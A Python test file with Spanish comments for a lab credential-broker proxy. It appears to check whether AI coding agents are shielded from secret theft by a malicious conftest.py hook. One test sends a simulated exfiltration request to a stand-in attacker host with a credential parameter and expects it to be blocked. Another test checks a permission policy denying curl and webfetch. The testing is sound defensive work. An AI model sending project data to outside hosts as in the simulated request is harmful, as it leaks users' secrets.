"""Pruebas integradas del Broker de Credenciales (Secretless Proxy), API L2 y Politica N3."""
import json
import socket
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

import sys
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "laboratorio" / "atacante"))
sys.path.insert(0, str(ROOT / "laboratorio" / "proxy"))
sys.path.insert(0, str(ROOT / "orquestador"))

import server as srv_lab
import proxy as proxy_lab
import run as orquestador


class TestBrokerCredencialesYN3(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.secreto_real = "CANARY-ENV-9f8e7d6c5b4a"
        srv_lab.TOKEN_ESPERADO["valor"] = cls.secreto_real
        srv_lab.HISTORIAL.clear()

        cls.httpd = ThreadingHTTPServer(("127.0.0.1", 0), srv_lab.Handler)
        cls.api_port = cls.httpd.server_address[1]
        cls.t_api = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.t_api.start()

        proxy_lab.ALLOW = ["opencode.ai", "models.dev"]
        proxy_lab.BROKER_HOSTS = ["api.lab"]
        proxy_lab.BROKER_SECRET = cls.secreto_real
        proxy_lab.BROKER_UPSTREAM = f"127.0.0.1:{cls.api_port}"

        cls.proxy_sock = socket.socket()
        cls.proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        cls.proxy_sock.bind(("127.0.0.1", 0))
        cls.proxy_sock.listen(16)
        cls.proxy_port = cls.proxy_sock.getsockname()[1]

        def _loop_proxy():
            while True:
                try:
                    c, _ = cls.proxy_sock.accept()
                    threading.Thread(target=proxy_lab.atender, args=(c,), daemon=True).start()
                except OSError:
                    break

        cls.t_proxy = threading.Thread(target=_loop_proxy, daemon=True)
        cls.t_proxy.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        cls.proxy_sock.close()

    def setUp(self):
        srv_lab.HISTORIAL.clear()

    def _opener_con_proxy(self):
        proxy_handler = urllib.request.ProxyHandler({
            "http": f"http://127.0.0.1:{self.proxy_port}",
            "https": f"http://127.0.0.1:{self.proxy_port}",
        })
        return urllib.request.build_opener(proxy_handler)

    def test_1_uso_legitimo_sin_conocer_clave(self):
        """El agente consulta api.lab sin enviar ni conocer la clave; el proxy la inyecta."""
        opener = self._opener_con_proxy()
        req = urllib.request.Request("http://api.lab:8000/v1/reporte")
        with opener.open(req, timeout=5) as resp:
            self.assertEqual(resp.status, 200)
            datos = json.loads(resp.read().decode("utf-8"))
            self.assertEqual(datos["estado_ci"], "aprobado")
            self.assertTrue(datos["autenticado_via_broker"])

        self.assertEqual(len(srv_lab.HISTORIAL), 1)
        self.assertEqual(srv_lab.HISTORIAL[0]["tipo"], "api_legitima")
        self.assertTrue(srv_lab.HISTORIAL[0]["autorizado"])

    def test_2_exfiltracion_a1c_bloqueada_y_sin_clave(self):
        """Un hook como conftest.py intentando enviar datos a atacante.lab recibe 403 y no filtra la clave."""
        opener = self._opener_con_proxy()
        url_ataque = "http://atacante.lab:8000/collect?id=test&e=CREDENTIAL_MANAGED_BY_PROXY"
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            opener.open(url_ataque, timeout=5)
        self.assertEqual(ctx.exception.code, 403)
        ctx.exception.close()
        self.assertEqual(len(srv_lab.HISTORIAL), 0)

    def test_3_acceso_directo_sin_broker_rechazado(self):
        """Si alguien llama al endpoint sin pasar la clave real, recibe 401 Unauthorized."""
        url_directa = f"http://127.0.0.1:{self.api_port}/v1/reporte"
        with self.assertRaises(urllib.error.HTTPError) as ctx:
            urllib.request.urlopen(url_directa, timeout=5)
        self.assertEqual(ctx.exception.code, 401)
        ctx.exception.close()

    def test_4_preparacion_workspace_n3_inyecta_politica_permisos(self):
        """El nivel N3 incluye opencode.json con validacion de herramientas bash y webfetch."""
        with tempfile.TemporaryDirectory() as tmp:
            ws = orquestador.preparar_workspace(Path(tmp), "A1c", "RUN-TEST", nivel="N3")
            cfg_path = ws / "opencode.json"
            self.assertTrue(cfg_path.exists())
            cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
            self.assertEqual(cfg["permission"]["webfetch"], "deny")
            self.assertEqual(cfg["permission"]["bash"]["*curl*"], "deny")
            self.assertEqual(cfg["permission"]["bash"]["pytest*"], "allow")


if __name__ == "__main__":
    unittest.main()
